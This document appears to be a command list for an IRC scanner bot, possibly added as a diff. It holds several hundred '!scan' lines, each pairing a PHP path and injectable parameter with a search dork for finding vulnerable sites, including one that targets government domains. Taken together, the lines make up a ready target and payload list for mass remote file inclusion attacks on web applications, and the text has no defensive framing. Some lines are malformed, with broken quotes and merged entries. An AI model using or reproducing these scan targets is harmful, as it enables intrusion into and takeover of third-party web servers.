+!scan /index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is A Free
+!scan /index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is A Free"
+!scan /index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is"
+!scan /index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= com_frontpage
+!scan /index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= Mambo is A Free
+!scan /index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path= "Powered by Mambo" *gov*
+!scan /index.php?a= ".php?a="
+!scan /index.php?a= "index.php?a="
+!scan /index.php?acao= "index.php?acao="
+!scan /index.php?acao= .php?acao=
+!scan /index.php?acao= index.php?acao=
+!scan /index.php?act= "index.php?act="
+!scan /index.php?act= index.php?act=
+!scan /index.php?action= ".php?action="
+!scan /index.php?action= "index.php?action="
+!scan /index.php?arg= .php?arg=
+!scan /index.php?arg= index.php?arg=
+!scan /index.php?arq= .php?arq=
+!scan /index.php?arq= index.php?arq=
+!scan /index.php?arquivo= .php?arquivo=
+!scan /index.php?arquivo= "index.php?arquivo="
+!scan /index.php?b= "index.php?b="
+!scan /index.php?ba= "index.php?ba="
+!scan /index.php?bas= ".php?bas="
+!scan /index.php?bas= "index.php?bas="
+!scan /index.php?body= "index.php?body="
+!scan /index.php?body= index.php?body=
+!scan /index.php?c= "index.php?c="
+!scan /index.php?c= .php?c=
+!scan /index.php?c= index.php?c=
+!scan /index.php?c= ".php?c="
+!scan /index.php?c=id&searchword= "index.php?c=id&searchword="
+!scan /index.php?cal= "index.php?cal="
+!scan /index.php?cal= .php?cal=
+!scan /index.php?cal= index.php?cal=
+!scan /index.php?cal= ".php?cal="
+!scan /index.php?canal= "index.php?canal="
+!scan /index.php?cat= "index.php?cat="
+!scan /index.php?cms= "index.php?cms="
+!scan /index.php?cms= index.php?cms=
+!scan /index.php?command= ".php?command="
+!scan /index.php?command= "index.php?command="
+!scan /index.php?configFile= "index.php?configFile="
+!scan /index.php?cont= "index.php?cont="
+!scan /index.php?content= .php?content=
+!scan /index.php?content= index.php?content=
+!scan /index.php?content= "index.php?content="
+!scan /index.php?conteudo= "index.php?conteudo="
+!scan /index.php?d1= ".php?d1="
+!scan /index.php?def= ".php?def="
+!scan /index.php?def= "index.php?def="
+!scan /index.php?def= index.php?def=
+!scan /index.php?dept= "index.php?dept="
+!scan /index.php?directfile= "index.php?directfile="
+!scan /index.php?dn= ".php?dn="
+!scan /index.php?dn= "index.php?dn="
+!scan /index.php?dn= .php?dn=
+!scan /index.php?dn= /index.php?dn=
+!scan /index.php?do= "index.php?do="
+!scan /index.php?doc= "index.php?doc="
+!scan /index.php?dok= ".php?dok="
+!scan /index.php?dok= "index.php?dok="
+!scan /index.php?dsp= "index.php?dsp="
+!scan /index.php?e= "index.php?e="
+!scan /index.php?exec= .php?exec=
+!scan /index.php?exec= index.php?exec=
+!scan /index.php?f= "index.php?f="
+!scan /index.php?f1= ".php?f1="
+!scan /index.php?fase= ".php?fase="
+!scan /index.php?fase= "index.php?fase="
+!scan /index.php?file= "index.php?file="
+!scan /index.php?filepath=
+!scan /index.php?fn= ".php?fn="
+!scan /index.php?fn= "index.php?fn="
+!scan /index.php?fPage= ".php?fPage="
+!scan /index.php?fPage= "index.php?fPage="
+!scan /index.php?fPage= .php?fPage=
+!scan /index.php?fPage= index.php?fPage=
+!scan /index.php?fset= ".php?fset="
+!scan /index.php?func= ".php?func="
+!scan /index.php?funcion= "index.php?funcion="
+!scan /index.php?function=custom&custom= custom
+!scan /index.php?go= "index.php?go="
+!scan /index.php?go= index.php?go=
+!scan /index.php?go1= "index.php?go1="
+!scan /index.php?go1= index.php?go1=
+!scan /index.php?gorumdir= "index.php?gorumdir="
+!scan /index.php?goto= ".php?goto="
+!scan /index.php?goto= "index.php?goto="
+!scan /index.php?id= "index.php?id="
+!scan /index.php?id= "/index.php?id=*.php"
+!scan /index.php?id= "index.php?id=*.php"
+!scan /index.php?id=&lang= ".php?id="
+!scan /index.php?id=&lang= "index.php?id="
+!scan /index.php?id=&page= ".php?id="
+!scan /index.php?id=&page= "index.php?id="
+!scan /index.php?id=1&lang= ".php?id="
+!scan /index.php?id=1&lang= "index.php?id="
+!scan /index.php?id=1&lang= index.php?i=
+!scan /index.php?id=1&lang= index.php?id=
+!scan /index.php?inc= ".php?inc="
+!scan /index.php?inc= "index.php?inc="
+!scan /index.php?incl= "index.php?incl="
+!scan /index.php?include= "index.php?include="
+!scan /index.php?inhalt= "index.php?inhalt="
+!scan /index.php?ir= ".php?ir="
+!scan /index.php?ir= "index.php?ir="
+!scan /index.php?kobr= "index.php?kobr="
+!scan /index.php?kobr= "index.php?kobr="index.php?pg= "index.php?pg="
+!scan /index.php?l= "index.php?l="
+!scan /index.php?lang= "index.php?lang="
+!scan /index.php?lang= index.php?lang=
+!scan /index.php?lang=&page= .php?lang=
+!scan /index.php?lang=&page= index.php?lang=
+!scan /index.php?lang=en&cat= ".php?lang="
+!scan /index.php?lang=en&cat= "index.php?lang="
+!scan /index.php?lang=en&page= ".php?lang="
+!scan /index.php?lang=en&page= "index.php?lang="
+!scan /index.php?lang=en&page= .php?lang=
+!scan /index.php?lang=en&page= index.php?lang=
+!scan /index.php?lang=gr&file "index.php?lang=gr&file=*.php"
+!scan /index.php?langc= "index.php?langc="
+!scan /index.php?Language= "index.php?Language="
+!scan /index.php?lg= "index.php?lg="
+!scan /index.php?lg= index.php?lg=
+!scan /index.php?link=
+!scan /index.php?link= "index.php?link="
+!scan /index.php?lk= ".php?lk="
+!scan /index.php?ll= "index.php?ll="
+!scan /index.php?ln= "index.php?ln="
+!scan /index.php?ln= .php?ln=
+!scan /index.php?ln= index.php?ln=
+!scan /index.php?ln= ".php?ln="
+!scan /index.php?lng= "index.php?lng="
+!scan /index.php?lng= index.php?lng=
+!scan /index.php?lnk= "index.php?lnk="
+!scan /index.php?lnk= .php?lnk=
+!scan /index.php?lnk= index.php?lnk=
+!scan /index.php?lnk= ".php?lnk="
+!scan /index.php?load= "/index.php?load=*.php"
+!scan /index.php?Load= "index.php?Load="
+!scan /index.php?loc= ".php?loc="
+!scan /index.php?loc= .php?loc=
+!scan /index.php?loc= .br/index.php?loc=
+!scan /index.php?loc=&cat= ".php?loc="
+!scan /index.php?loc=&cat= "index.php?loc="
+!scan /index.php?loc=&lang= ".php?loc="
+!scan /index.php?loc=&lang= "index.php?loc="
+!scan /index.php?loc=&page= "index.php?loc="
+!scan /index.php?loc=start&page= "index.php?loc="
+!scan /index.php?loca= .php?loca=
+!scan /index.php?loca= index.php?loca=
+!scan /index.php?ltr= ".php?ltr="
+!scan /index.php?ltr= "index.php?ltr="
+!scan /index.php?lv1= "index.php?lv1="
+!scan /index.php?m= "index.php?m="
+!scan /index.php?main= ".php?main="
+!scan /index.php?meio.php= "index.php?meio.php="
+!scan /index.php?meio= ".php?meio="
+!scan /index.php?meio= "index.php?meio="
+!scan /index.php?meio= .php?meio=
+!scan /index.php?meio= index.php?meio=
+!scan /index.php?menu= "net/index.php?menu=*.php"
+!scan /index.php?menu=deti&page= "index.php?menu=deti&page"
+!scan /index.php?mf= ".php?mf="
+!scan /index.php?mf= .php?mf=
+!scan /index.php?mf= index.php?mf=
+!scan /index.php?mid= ".php?mid="
+!scan /index.php?mid= "index.php?mid="
+!scan /index.php?mid= .php?mid=
+!scan /index.php?mid= index.php?mid=
+!scan /index.php?middle= ".php?middle="
+!scan /index.php?middle= "index.php?middle="
+!scan /index.php?middle= index.php?middle=
+!scan /index.php?middlePart=
+!scan /index.php?mn= ".php?mn="
+!scan /index.php?mn= "index.php?mn="
+!scan /index.php?mod= ".php?mod="
+!scan /index.php?mod= "index.php?mod="
+!scan /index.php?mode= "com/index.php?mode=*.php"
+!scan /index.php?new= "index.php?new="
+!scan /index.php?news= "index.php?news="
+!scan /index.php?nic= "index.php?nic="
+!scan /index.php?nic= "index.php?nic=*.php"
+!scan /index.php?oldal= "index.php?oldal=*.php"
+!scan /index.php?opcao= "index.php?opcao="
+!scan /index.php?open= "index.php?open=
+!scan /index.php?open= "index.php?open="
+!scan /index.php?openfile= "index.php?openfile="
+!scan /index.php?ort= "index.php?ort="
+!scan /index.php?p= "index.php?p="
+!scan /index.php?p= "/index.php?p=*.php"
+!scan /index.php?p= "edu/index.php?p=*.php"
+!scan /index.php?pag= "index.php?pag="
+!scan /index.php?pag= index.php?pag=
+!scan /index.php?pag= "/index.php?pag=*.php"
+!scan /index.php?pag= "com/index.php?pag=*.php"
+!scan /index.php?pag= "index.php?pag=*.php"
+!scan /index.php?pag= "index.php?pag=*.php" 
+!scan /index.php?page= "index.php?pagedb=rss"
+!scan /index.php?page= index.php%"Submit%Articles"%"Member%Login"%"Top%Authors"
+!scan /index.php?page= index.php?page=
+!scan /index.php?page= "/index.php?page=*.php"
+!scan /index.php?page= "edu/index.php?page=*.php"
+!scan /index.php?page= php5?page=
+!scan /index.php?page=&lang= .php?p=
+!scan /index.php?page=&lang= .php?pag=
+!scan /index.php?page=&lang= .php?page=
+!scan /index.php?page=&lang= .php?pg=
+!scan /index.php?page=&lang= index.php?p=
+!scan /index.php?page=&lang= index.php?pag=
+!scan /index.php?page=&lang= index.php?page=
+!scan /index.php?page=&lang= index.php?pg=
+!scan /index.php?page1= ".php?page1="
+!scan /index.php?page1= "index.php?page1="
+!scan /index.php?pageN= ".php?pageN="
+!scan /index.php?pagename= phpquiz
+!scan /index.php?pager= .php?pager=
+!scan /index.php?pager= index.php?pager=
+!scan /index.php?pageurl= "index.php?pageurl="
+!scan /index.php?pageurl= "index.php?pageurl=*.php"
+!scan /index.php?pageurl= index.php?pageurl=*.php
+!scan /index.php?pagina= "index.php?pagina="
+!scan /index.php?pagina= index.php?pagina=
+!scan /index.php?pagina= "index.php?pagina=*.php"
+!scan /index.php?pagina1= "index.php?pagina1="
+!scan /index.php?pagina1= index.php?pagina1=
+!scan /index.php?path= "index.php?path="
+!scan /index.php?pg= "index.php?pg="
+!scan /index.php?pg= index.php?pg=
+!scan /index.php?pilih= "index.php?pilih="
+!scan /index.php?place= "index.php?place="
+!scan /index.php?prefix= "index.php?prefix="
+!scan /index.php?principal= "index.php?principal="
+!scan /index.php?prod= ".php?prod="
+!scan /index.php?prod= ".php?product="
+!scan /index.php?product= ".php?prod="
+!scan /index.php?product= ".php?product="
+!scan /index.php?r= "index.php?r="
+!scan /index.php?r= "index.php?r=*.php"
+!scan /index.php?rage= "index.php?rage="
+!scan /index.php?recipe=
+!scan /index.php?root_PATH= "index.php?root_PATH="
+!scan /index.php?RP_PATH= reviewpost
+!scan /index.php?s= ".php?s="
+!scan /index.php?s= "index.php?s="
+!scan /index.php?s= .php?s=
+!scan /index.php?s= index.php?s=
+!scan /index.php?screen= "index.php?screen="
+!scan /index.php?sec= "index.php?sec="
+!scan /index.php?sec= index.php?sec=
+!scan /index.php?secao= "index.php?secao="
+!scan /index.php?secao= .php?secao=
+!scan /index.php?secao= index.php?secao=
+!scan /index.php?secao= ".php?secao="
+!scan /index.php?seccion= .php?seccion=
+!scan /index.php?seccion= /index.php?seccion=
+!scan /index.php?seite= .php?seite=
+!scan /index.php?seite= /index.php?seite=
+!scan /index.php?sel= "index.php?sel=*.php"
+!scan /index.php?sel= "index.php?sel=*.php"         
+!scan /index.php?select= ".php?select="
+!scan /index.php?select= .php?select=
+!scan /index.php?select= index.php?select=
+!scan /index.php?server= "index.php?server="
+!scan /index.php?set= ".php?set="
+!scan /index.php?set= "index.php?set="
+!scan /index.php?set= .php?set=
+!scan /index.php?set= index.php?set=
+!scan /index.php?sf= "index.php?sf="
+!scan /index.php?show= ".php?show="
+!scan /index.php?show= "index.php?show="
+!scan /index.php?side= "index.php?side="
+!scan /index.php?sit= ".php?sit="
+!scan /index.php?sit= "index.php?sit="
+!scan /index.php?site= "index.php?site="
+!scan /index.php?site= index.php?site=
+!scan /index.php?site= "index.php?site=*.php"
+!scan /index.php?site1= "index.php?site1="
+!scan /index.php?site1= index.php?site1=
+!scan /index.php?slang= ".php?slang="
+!scan /index.php?slang= "index.php?slang="
+!scan /index.php?slang= .php?slang=
+!scan /index.php?slang= /index.php?slang=
+!scan /index.php?sort= ".php?sort="
+!scan /index.php?spage= ".php?spage="
+!scan /index.php?spage= "index.php?spage="
+!scan /index.php?spage= .php?spage=
+!scan /index.php?spage= index.php?spage=
+!scan /index.php?ss= ".php?ss="
+!scan /index.php?ss= "index.php?ss="
+!scan /index.php?st= "index.php?st="
+!scan /index.php?stranica= "index.php?stranica="
+!scan /index.php?sub= "index.php?sub="
+!scan /index.php?sub= .php?sub=
+!scan /index.php?sub= index.php?sub=
+!scan /index.php?sub= ""index.php?sub=""
+!scan /index.php?sub= ".php?sub="
+!scan /index.php?sub= "il/index.php?sub=*.php"
+!scan /index.php?sub2= "index.php?sub2="
+!scan /index.php?subp= ".php?subp="
+!scan /index.php?subp= "index.php?subp="
+!scan /index.php?subpage= ".php?subpage="
+!scan /index.php?subpage= "index.php?subpage="
+!scan /index.php?t= "index.php?t="
+!scan /index.php?t= "/index.php?t=*.php"
+!scan /index.php?table= .php?table=
+!scan /index.php?table= index.php?table=
+!scan /index.php?task= .php?task=
+!scan /index.php?task= index.php?task=
+!scan /index.php?template= "index.php?"
+!scan /index.php?templateid=
+!scan /index.php?term= ".php?term="
+!scan /index.php?textfield= ".php?textfield="
+!scan /index.php?theme= "index.php?theme="
+!scan /index.php?theme= .php?theme=
+!scan /index.php?theme= index.php?theme=
+!scan /index.php?themesdir= "Segue v."+"Middlebury College"
+!scan /index.php?themesdir= index.php?themesdir=
+!scan /index.php?topic= "/index.php?topic=*.php"
+!scan /index.php?trans= ".php?trans="
+!scan /index.php?trans= "index.php?trans="
+!scan /index.php?u= "/index.php?u=*.php"
+!scan /index.php?url= "index.php?url="
+!scan /index.php?v= "index.php?v="
+!scan /index.php?var= "index.php?var=*.php"
+!scan /index.php?var= "index.php?var1="
+!scan /index.php?var= "index.php?var2="
+!scan /index.php?var= index.php?va21=
+!scan /index.php?var= index.php?var=
+!scan /index.php?var= index.php?var=*.php
+!scan /index.php?var= index.php?var1=
+!scan /index.php?var= index.php?var2=
+!scan /index.php?var1= "index.php?var1="
+!scan /index.php?var1= index.php?var1=
+!scan /index.php?var2= index.php?var2=
+!scan /index.php?ver= ".php?ver="
+!scan /index.php?ver= "index.php?ver="
+!scan /index.php?ver= .php?ver=
+!scan /index.php?ver= index.php?ver=
+!scan /index.php?vis= .php?vis=
+!scan /index.php?vis= /index.php?vis=
+!scan /index.php?visualizar= "index.php?visualizar="
+!scan /index.php?way= .php?way=
+!scan /index.php?way= index.php?way=
+!scan /index.php?wpage= ".php?wpage="
+!scan /index.php?wpage= "index.php?wpage="
+!scan /index.php?x= "com/index.php?x=*.php"
+!scan /index.php?x= "index.php?x="
+!scan /index.php?x= "index.php?x=*.php"
+!scan /index.php3?act= ".php3?act="
+!scan /index.php3?act= .php3?act=
+!scan /index.php3?act= index.php3?act=
+!scan /index.php3?file= ".php3?f="
+!scan /index.php3?file= ".php3?file="
+!scan /index.php3?i= index.php3?i=
+!scan /index.php3?id= index.php3?id=
+!scan /index.php3?l= index.php3?l=
+!scan /index.php3?lang= index.php3?lang=
+!scan /index.php3?p= "index.php3?p="
+!scan /index.php3?p= "index.php3?pag="
+!scan /index.php3?p= "index.php3?page="
+!scan /index.php3?p= "index.php3?pg="
+!scan /index.php3?p= index.php3?p=
+!scan /index.php3?pag= index.php3?pag=
+!scan /index.php3?page= index.php3?page=
+!scan /index.php3?pg= index.php3?pg=
+!scan /index.php3?s= ".php3?s="
+!scan /index.php3?s= "index.php3?s="
+!scan /index.php3?s= .php3?s=
+!scan /index.php3?s= index.php3?s=
+!scan /index.php4?lang= ".php4?lang="
+!scan /index.php4?lang= "index.php4?lang="
+!scan /index.php4?lang= .php4?lang=
+!scan /index.php4?lang= index.php4?lang="
+!scan /index.php5?lang= ".php5?lang="
+!scan /index.php5?lang= "index.php5?lang="
+!scan /index.php5?lang= index.php5?lang=
+!scan /index.phpmain.php?x= "index.phpmain.php?x="
+!scan /index_principal.php?pagina= "index_principal.php?pagina="
+!scan /index0.php?show= "index0.php?show="
+!scan /index0.php?show= index0.php?show=*.php"
+!scan /index1.php?= "index1.php?="
+!scan /index1.php?= "index1.php?=*.php?
+!scan /index1.php?= index1.php?=
+!scan /index1.php?arg= .php?arg=
+!scan /index1.php?arq= .php?arq=
+!scan /index1.php?choix= "index1.php?choix="
+!scan /index1.php?dat= "index1.php?dat="
+!scan /index1.php?func= ".php?func="
+!scan /index1.php?go=  "index1.php?go=*.php"
+!scan /index1.php?inc= ".php?inc="
+!scan /index1.php?lk= ".php?lk="
+!scan /index1.php?ln= .php?ln=
+!scan /index1.php?ltr= ".php?ltr="
+!scan /index1.php?menu= "index1.php?menu"
+!scan /index1.php?mid= index1.php?mid=
+!scan /index1.php?p= ".php?p="
+!scan /index1.php?p= ".php?pag="
+!scan /index1.php?p= ".php?page="
+!scan /index1.php?p= ".php?pg="
+!scan /index1.php?page= "index1.php?page="
+!scan /index1.php?s= "index1.php?s="
+!scan /index1.php?show= ".php?show="
+!scan /index1.php?show= "index1.php?show="
+!scan /index1.php?site= "index1.php?site="
+!scan /index1.php?table= .php?table=
+!scan /index1.php?x= "index1.php?x="
+!scan /index2.php?= "index2.php?="
+!scan /index2.php?= index2.php?=
+!scan /index2.php?= "index2.php?=*.php?"
+!scan /index2.php?a= "index2.php?a="
+!scan /index2.php?aa= "index2.php?aa="
+!scan /index2.php?acao= "index2.php?acao="
+!scan /index2.php?action=
+!scan /index2.php?adresa=
+!scan /index2.php?arg= .php?arg=
+!scan /index2.php?arq= .php?arq=
+!scan /index2.php?ascii_seite= "index2.php?ascii_seite="
+!scan /index2.php?b= "index2.php?b="
+!scan /index2.php?base_dir=
+!scan /index2.php?basepath=
+!scan /index2.php?c= ".php?c="
+!scan /index2.php?c= "index2.php?c="
+!scan /index2.php?cal= "index2.php?cal="
+!scan /index2.php?cont= ".php?cont="
+!scan /index2.php?cont= "index2.php?cont="
+!scan /index2.php?content= ".php?content="
+!scan /index2.php?content= "index2.php?cont="
+!scan /index2.php?content= "index2.php?content="
+!scan /index2.php?content= .php?content=
+!scan /index2.php?content= index2.php?content=
+!scan /index2.php?directfile= "index2.php?directfile="
+!scan /index2.php?DoAction= "index2.php?DoAction="
+!scan /index2.php?e= "index2.php?e="
+!scan /index2.php?f= "index2.php?f="
+!scan /index2.php?funcion= "index2.php?funcion="
+!scan /index2.php?g= "index2.php?g="
+!scan /index2.php?gorumdir= "index2.php?gorumdir="
+!scan /index2.php?h= "index2.php?h="
+!scan /index2.php?i= "index2.php?i="
+!scan /index2.php?i= /index2.php?i=
+!scan /index2.php?ID= "index2.php?ID="
+!scan /index2.php?inc= ".php?inc="
+!scan /index2.php?j= "index2.php?j="
+!scan /index2.php?k= "index2.php?k="
+!scan /index2.php?l= ".php?l="
+!scan /index2.php?l= "index2.php?l="
+!scan /index2.php?lang= "index2.php?lang="
+!scan /index2.php?language= "index2.php?language="
+!scan /index2.php?left=
+!scan /index2.php?lg= "index.php?lg="
+!scan /index2.php?lk= ".php?lk="
+!scan /index2.php?ll= "index2.php?ll="
+!scan /index2.php?ln= ".php?ln="
+!scan /index2.php?ln= "index.php?ln="
+!scan /index2.php?lng= "index.php?lng="
+!scan /index2.php?lnk= "index2.php?lnk="
+!scan /index2.php?loca= .php?loca=
+!scan /index2.php?loca= index2.php?loca=
+!scan /index2.php?lv1= "index2.php?lv1="
+!scan /index2.php?m= "index2.php?m="
+!scan /index2.php?meio= .php?meio=
+!scan /index2.php?n= "index2.php?n="
+!scan /index2.php?o= "index2.php?o="
+!scan /index2.php?p= "index2.php?p="
+!scan /index2.php?p= "index2.php?p=*.php"
+!scan /index2.php?pag= "index2.php?pag="
+!scan /index2.php?pag= "/index2.php?pag=*.php"
+!scan /index2.php?path= "index2.php?path="
+!scan /index2.php?pg= "index2.php?pg="
+!scan /index2.php?prefix= "index2.php?prefix="
+!scan /index2.php?q= "index2.php?q="
+!scan /index2.php?r= "index2.php?r="
+!scan /index2.php?root_PATH= "index2.php?root_PATH="
+!scan /index2.php?s= ".php?s="
+!scan /index2.php?s= "index2.php?s="
+!scan /index2.php?server= "index2.php?server="
+!scan /index2.php?showpage=
+!scan /index2.php?showpage= "index2.php?showpage="
+!scan /index2.php?sub= "index2.php?sub="
+!scan /index2.php?sub2= "index2.php?sub2="
+!scan /index2.php?t= "index2.php?t="
+!scan /index2.php?table= .php?table=
+!scan /index2.php?theme= "index2.php?theme="
+!scan /index2.php?to= "/index2.php?to=*.php"
+!scan /index2.php?u= "index2.php?u="
+!scan /index2.php?url_page= "index2.php?url_page="
+!scan /index2.php?v= "index2.php?v="
+!scan /index2.php?x= "index2.php?x="
+!scan /index2.php?x= .php?x=
+!scan /index2.php?x= index2.php?x=
+!scan /index2.php?x= index2.php?x=*.php"
+!scan /index2.php?y= "index2.php?y="
+!scan /index2.php?z= "index2.php?z="
+!scan /index3.php?aa= "index3.php?aa="
+!scan /index5.php?body= "index5.php?body="
+!scan /index5.php?cont= "index5.php?cont="
+!scan /index5.php?content= "index5.php?content="
+!scan /index5.php?do= "index5.php?do="
+!scan /index5.php?inc= "index5.php?inc="
+!scan /index5.php?include= "index5.php?include="
+!scan /index5.php?lang= "index5.php?lang="
+!scan /index5.php?language= "index5.php?language="
+!scan /index5.php?lv1= "index5.php?lv1="
+!scan /index5.php?main= "index5.php?main="
+!scan /index5.php?p= "index5.php?p="
+!scan /index5.php?pag= "index5.php?pag="
+!scan /index5.php?pagina= "index5.php?pagina="
+!scan /index5.php?pg= "index5.php?pg="
+!scan /index5.php?root= "index5.php?root="
+!scan /index5.php?visualizar= "index5.php?visualizar="
+!scan /info.php?ln= ".php?ln="
+!scan /info.php?ln= "info.php?ln="
+!scan /info.php?ln= info.php?ln=
+!scan /interna.php?meio= ".php?meio="
+!scan /interna/tiny_mce/plugins/ibrowser/ibrowser.php?tinyMCE_imglib_include= "Papoo CMS"
+!scan /".php?p="
+!scan /com_extended_registration
+!scan /mod.php?mod=siteinfo&id= config.php?_CCFG[_PKG_PATH_DBSE]=
+!scan /jscript.php?my_ms[root]= "myspeach" "chat_exemple.php"
+!scan /jscript.php?my_ms[root]= "myspeach" "chat_exemple.php" 
+!scan /kalender.php?vis= ".php?vis="
+!scan /kalender.php?vis= "kalender.php"
+!scan /kalender.php?vis= "kalender.php?vis="
+!scan /lang.php?arg= .php?arg=
+!scan /lang.php?arq= .php?arq=
+!scan /lang.php?lk= ".php?lk="
+!scan /lang.php?ln= .php?ln=
+!scan /lang.php?subp= ".php?sub="
+!scan /lang.php?subp= ".php?subp="
+!scan /lang.php?subpage= ".php?subpage="
+!scan /lib/base.php?BaseCfg[BaseDir]= /lib/base.php?BaseCfg[BaseDir]=
+!scan /lib/db/ez_sql.php?lib_path= ttCMS
+!scan /lib/db/ez_sql.php?lib_path= ttCMS <= v4
+!scan /lib/gore.php?libpath= "/SQuery/"
+!scan /lib/language.php?_LIB_DIR= "language.php"
+!scan /lib/language.php?_LIB_DIR= "language.php?_LIB_DIR="
+!scan /lib/language.php?_LIB_DIR= "LMS"
+!scan /lib/static/header.php?set_menu= iPhoto Album
+!scan /lib/static/header.php?set_menu= iPhotoAlbum
+!scan /lib/static/header.php?set_menu= iPhotoAlbum v1.1
+!scan /library/editor/editor.php?root=
+!scan /library/editor/editor.php?root= 
+!scan /library/lib.php?root=
+!scan /library/lib.php?root= 
+!scan /link.php?do= ".php?do="
+!scan /list.php?product= .php?product=
+!scan /list.php?table= .php?table=
+!scan /llindex.php?sub=
+!scan /ln.php?ln= .php?ln=
+!scan /load_lang.php?_SERWEB[serwebdir]= "load_lang.php"
+!scan /load_lang.php?_SERWEB[serwebdir]= "load_lang.php?_SERWEB[serwebdir]=
+!scan /load_lang.php?_SERWEB[serwebdir]= "SerWeb 0.9.4"
+!scan /loc.php?l= ".php?l="
+!scan /loc.php?l= ".php?loc="
+!scan /loc.php?lang= ".php?lang="
+!scan /loc.php?lang= ".php?loc="
+!scan /loc.php?loc= ".php?loc="
+!scan /loc.php?loc= "loc.php?loc="
+!scan /login.php?dir= "login.php?dir="
+!scan /login.php?dir= login.php?dir=
+!scan /login.php?loca= .php?loca=
+!scan /m2f/m2f_phpbb204.php?m2f_root_path= /m2f_usercp.php?
+!scan /magazine.php?inc= ".php?inc="
+!scan /mai.php?act= "mai.php?act="
+!scan /mai.php?act= mai.php?act=
+!scan /mai.php?loc= "mai.php?loc="
+!scan /mai.php?loc= mai.php?loc=
+!scan /mai.php?src= "mai.php?src="
+!scan /mai.php?src= mai.php?src=
+!scan /main.html.php?seite= .php?seite=
+!scan /main.php?a= ".php?a="
+!scan /main.php?action= "main.php?action="
+!scan /main.php?arg= .php?arg=
+!scan /main.php?ba= ".php?ba="
+!scan /main.php?ba= "main.php?ba="
+!scan /main.php?c= "main.php?c="
+!scan /main.php?cat= "main.php?cat="
+!scan /main.php?command= ".php?command="
+!scan /main.php?command= "main.php?command="
+!scan /main.php?configFile= "main.php?configFile=" 
+!scan /main.php?cont= "main.php?cont="
+!scan /main.php?content= "main.php?content=" 
+!scan /main.php?d1= ".php?d1="
+!scan /main.php?d1= "main.php?d1="
+!scan /main.php?do= "main.php?do="
+!scan /main.php?f1= ".php?f1="
+!scan /main.php?filepath=
+!scan /main.php?fset= ".php?fset="
+!scan /main.php?id= "main.php?id=*.php"
+!scan /main.php?inc= ".php?inc="
+!scan /main.php?inc= "main.php?inc="
+!scan /main.php?link= "main.php?link="
+!scan /main.php?ln= .php?ln=
+!scan /main.php?ltr= ".php?ltr="
+!scan /main.php?ltr= ".php?ltr=" 
+!scan /main.php?meio= "main.php?meio="
+!scan /main.php?p= "main.php?p=" 
+!scan /main.php?pag= "main.php?pag="
+!scan /main.php?page= "main.php?page="
+!scan /main.php?page= "/main.php?page=*.php"
+!scan /main.php?pagina= "main.php?pagina="
+!scan /main.php?pagina= "main.php?pagina=*.php"
+!scan /main.php?s= ".php?s="
+!scan /main.php?s= "main.php?s="
+!scan /main.php?s= .php?s=
+!scan /main.php?s= main.php?s=
+!scan /main.php?sayfa= "main.php?sayfa="
+!scan /main.php?sayfa= main.php?sayfa=
+!scan /main.php?sit= ".php?sit="
+!scan /main.php?site= "main.php?site=" 
+!scan /main.php?table= .php?table=
+!scan /main.php?vis= ".php?vis="
+!scan /main.php?vis= "main.php?vis="
+!scan /main.php?vis= main.php?vis=
+!scan /main.php?x= "main.php?x="
+!scan /main.php?x= "main.php?x=" 
+!scan /main.php?x= "main.php?x=*.php"
+!scan /main.php3?act= ".php3?act="
+!scan /main.php3?act= "main.php3?act="
+!scan /main.php5?page= .php5?id=
+!scan /main1.php?arg= .php?arg=
+!scan /main1.php?ln= .php?ln=
+!scan /main2.php?ln= .php?ln=
+!scan /map.php?loc= map.php?loc=
+!scan /mcf.php?content= "mcf.php"
+!scan /mcf.php?content= "mcf.php" site:.de
+!scan /mcf.php?content= mcf.php
+!scan /media.php?page= "media.php?page="
+!scan /mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]= mediagallery/
+!scan /middle.php?file= .php?file=
+!scan /middle.php?file= .php?page=
+!scan /middle.php?file= ".php?file="
+!scan /middle.php?file= ".php?page="
+!scan /middle.php?file= "middle.php?file="
+!scan /middle.php?file= "middle.php?page="
+!scan /middle.php?file= middle.php?file=
+!scan /middle.php?file= middle.php?page=
+!scan /middle.php?page= .php?page=
+!scan /middle.php?page= ".php?page="
+!scan /middle.php?page= "middle.php?page="
+!scan /middle.php?page= middle.php?page=
+!scan /misc.php?do= ".php?do="
+!scan /mod.php?mod= ".php?mod="
+!scan /mod.php?mod= "mod.php?mod="
+!scan /modul.php?mod= ".php?mod="
+!scan /modul.php?mod= "modul.php?mod="
+!scan /module.php?mod= ".php?mod="
+!scan /module.php?mod= "module.php?mod="
+!scan /Module/Galerie.php?Ent= "Galerie.php"
+!scan /Module/Galerie.php?Lang= "Galerie.php"
+!scan /module_db.php?pivot_path= "module_db.php?pivot_path="
+!scan /modules/4nAlbum/public/displayCategory.php?basepath= modules.php?name=4nAlbum
+!scan /modules/agendax/addevent.inc.php?agendax_path= /agendax/
+!scan /modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]= "AllMyGuests"
+!scan /modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root= "Cjay Content 3"
+!scan /modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root= "spaw_control.class.php"
+!scan /modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root= "spaw_control.class.php?spaw_root="
+!scan /modules/coppermine/include/init.inc.php?CPG_M_DIR= modules.php?name=coppermine
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= coppermine
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= coppermine                                                                                                  
+!scan /modules/Forums/admin/admin_styles.php?phpbb_root_path= modules.php?name=forums
+!scan /modules/horoscope/footer.php?xoopsConfig[root_path]= "footer.php"
+!scan /modules/horoscope/footer.php?xoopsConfig[root_path]= "footer.php?xoopsConfig[root_path]="
